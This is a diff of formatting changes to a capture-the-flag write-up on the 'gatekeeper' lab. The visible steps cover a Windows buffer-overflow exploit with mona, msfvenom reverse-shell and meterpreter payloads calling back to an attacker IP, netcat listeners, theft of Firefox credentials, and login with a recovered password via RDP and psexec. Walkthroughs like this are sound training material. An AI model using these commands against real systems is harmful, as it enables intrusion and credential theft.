@@ -118,6 +118,7 @@ while True:
 - We know that we can crash the executable - so we might be able to do a buffer overflow and get a reverse shell
 
 - Create another script called exploit.py:
+
 ```python
 import socket
 
@@ -167,6 +168,7 @@ except:
 You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications)
 
 - On Kali, run the modified exploit.py script:
+
 ```bash
 python3 exploit.py
 
@@ -229,10 +231,10 @@ EIP contains normal pattern : ... (offset XXXX)
 - The following python script can be used to generate a string of bad chars from \x01 to \xff:
 (\x00 is excluded)
 
+```python
 for x in range(1, 256):
-
-print("\\x" + "{:02x}".format(x), end='')
-
+    print("\x" + "{:02x}".format(x), end='')
+```
 
 ![image17](../resources/c12219c031bb4c29887e674a496f3604.png)
 
@@ -250,7 +252,7 @@ print("\\x" + "{:02x}".format(x), end='')
 - Make a note of the address to which the ESP register points and use it in the following mona command:
 
 ```bash
-!mona compare -f C:\mona\gatekeeper\bytearray.bin -a \<address\>
+!mona compare -f C:\mona\gatekeeper\bytearray.bin -a <address>
 
 ```
 
@@ -273,6 +275,7 @@ If not, use the Window menu to switch to it. The window shows the results of the
 - We know that \x00 has been excluded already since it's a bad char, so the only one left to **remove** is **\x0a**
 
 - **Generate a new bytearray in mona**, specifying the **new badchar along with \x00**:
+
 ```bash
 !mona bytearray -b "\x00\x0a"
 ```
@@ -298,8 +301,9 @@ If not, use the Window menu to switch to it. The window shows the results of the
 ESP: 007119F8
 
 - Compare the results:
+
 ```bash
-!mona compare -f C:\mona\gatekeeper\bytearray.bin -a \<ESP_address\>
+!mona compare -f C:\mona\gatekeeper\bytearray.bin -a <ESP_address>
 
 ```
 
@@ -368,7 +372,8 @@ padding = "\x90" * 16
 
 - With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell
 
-- Start nc
+- Start nc:
+
 ```bash
 nc -lnvp 4444
 
@@ -409,7 +414,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.24.66 LPORT=4444 EXITFUNC=threa
 
 ![image38](../resources/8201b19f96564ef3b0e14733635bb572.png)
 
-- Set up nc listener
+- Set up nc listener:
+
 ```bash
 nc -lnvp 4444
 
@@ -448,6 +454,7 @@ systeminfo
 ![image44](../resources/d22378244bc348b29ee4211947df35db.png)
 
 - From a cmd.exe prompt, we can use the following wmic command to find any services executing from non-standard locations:
+
 ```bash
 wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\"
 
@@ -456,6 +463,7 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
 ![image45](../resources/533d54aeb65e42aaa3bdeac7d15c84d5.png)
 
 - Checking the permissions of the folder VMware:
+
 ```bash
 icacls "C:\Program Files\VMware"
 
@@ -480,6 +488,7 @@ post/multi/gather/firefox_creds
 ![image48](../resources/b70857365e2d4f2f8b8f347876fa001d.png)
 
 - First we need to get a meterpreter session:
+
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.24.66 LPORT=5555 -f exe -o reverse.exe
 python -m http.server
@@ -493,7 +502,8 @@ Run reverse.exe
 
 - Background session
 
-- Now use the post exploit
+- Now use the post exploit:
+
 ```bash
 use post/multi/gather/firefox_creds
 
@@ -520,6 +530,7 @@ Download firefox_decrypt.py
 ![image52](../resources/66625e8591254e8695abc24fea0d7797.png)
 
 - Now run the decrypter:
+
 ```bash
 python3 firefox_decrypt.py ~/.msf4/loot
 
@@ -527,7 +538,8 @@ python3 firefox_decrypt.py ~/.msf4/loot
 
 ![image53](../resources/1ea71a55555d4a0196a802c35d459ed3.png)
 
-- RDP
+- RDP:
+
 ```bash
 xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /cert:ignore /v:10.10.198.224
 
@@ -535,6 +547,7 @@ xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /cert:ignore /v:10.10.198.224
 Read root.txt
 
 - Or psexec:
+
 ```bash
 psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.198.224 cmd.exe
 
